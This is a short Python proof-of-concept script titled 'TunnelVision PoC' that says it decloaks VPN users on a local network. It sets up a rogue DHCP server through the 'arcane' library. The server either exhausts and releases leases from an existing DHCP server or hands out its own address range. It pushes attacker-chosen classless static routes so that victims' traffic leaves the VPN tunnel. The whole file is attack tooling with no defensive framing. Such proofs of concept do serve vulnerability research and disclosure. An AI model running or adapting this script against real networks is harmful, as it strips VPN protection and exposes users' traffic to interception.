#!/usr/bin/python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.dhcp.range_leaser import DHCPRangeLeaser
from arcane.runtime import RUNTIME
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent
from ipaddress import IPv4Address
import logging
import argparse


parser = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
parser.add_argument('-s', '--server', help="DHCP server to attack")
parser.add_argument('-n', '--network', help='Network addresses to lease')
parser.add_argument('-m', '--mask', help='Subnet mask')
parser.add_argument('-d', '--dns', help='DNS server')
parser.add_argument('-r', '--route', action='append', help="Route to add to table. May be listed more than once")
parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")

def main():
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPServerEvent.LEASE_OFFERED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(ARPTableEvent.ENTRY_CHANGED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPReleaseEvent.LEASE_RELEASED)

    interface = NetworkInterface(args.interface)
    options   = {}

    if args.server:
        lease_gen = DHCPSubleaser(interface)
        releaser  = DHCPReleaser(interface, lease_gen, args.server, sweep_time=5)
    else:
        start, end = args.network.split('-')
        lease_gen  = DHCPRangeLeaser(interface, IPv4Address(start), IPv4Address(end))
        options['subnet_mask'] = args.mask
        options['name_server'] = args.dns

    server= DHCPServer(interface, lease_gen, classless_static_routes=args.route, lease_time=10, **options)
    interface.thread.join()



if __name__ == "__main__":
    main()
